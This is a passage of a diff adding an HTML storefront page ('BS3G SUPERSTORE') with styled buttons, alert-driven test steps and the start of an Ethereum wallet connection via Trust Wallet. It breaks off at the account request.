@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BS3G SUPERSTORE 👑 LUXURY</title>
+<style>
+body{background:#000;color:gold;text-align:center;font-family:Arial;margin:0;padding:0}
+.hero{background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.9)),url('IMG-20261012-WA8167.jpg');background-size:cover;background-position:center;padding:40px 12px;border-bottom:3px solid gold}
+h1{font-size:30px;text-shadow:0 0 10px gold;margin:0}
+.shop{background:#111;margin:10px;border-radius:14px;padding:12px;border:1px solid #333}
+button{border:none;border-radius:12px;font-weight:bold;cursor:pointer}
+.throne-img{width:100%;max-width:400px;border-radius:14px;border:2px solid gold;margin:10px auto;display:block}
+</style>
+</head>
+<body>
+<div class="hero">
+<h1>BS3G SUPERSTORE 👑</h1>
+<p style="color:#0f0;font-size:12px">NO-BIGINT FIX WORKS! • BS3G REAL PAYMENTS</p>
+<img src="IMG-20261012-WA9541.jpg" class="throne-img" alt="Lion Throne">
+<p style="color:gold;font-size:13px">LION KING • THRONE COLLECTION • LUXURY MALL</p>
+
+<!-- WHITE TEST - DISAPPEARS AFTER OK -->
+<button id="whiteBtn" onclick="alert('✅ TEST WORKS! Bug fixed! Now BLUE will glow GREEN!');document.getElementById('status').innerHTML='✅ TEST OK - TAP BLUE BELOW (Green Glowing!)';document.getElementById('log').innerHTML+='<br>> TEST OK';this.style.display='none';var b=document.getElementById('blueBtn');b.scrollIntoView({behavior:'smooth'});b.style.border='5px solid #0f0';b.style.boxShadow='0 0 30px #0f0';b.style.transform='scale(1.05)';" style="background:white;color:black;padding:14px 24px;font-size:14px;margin:10px">1️⃣ TEST WHITE - TAP ME FIRST</button>
+
+<br>
+<button onclick="
+  alert('BLUE CLICKED! Connecting...');
+  try{
+    var eth=window.ethereum||window.trustwallet;
+    if(!eth){alert('❌ No wallet! Open INSIDE Trust Wallet App -> Discover -> Browser -> Paste link');}
+    else{
+      eth.request({method:'eth_requestAccounts'}).then(function(acc){
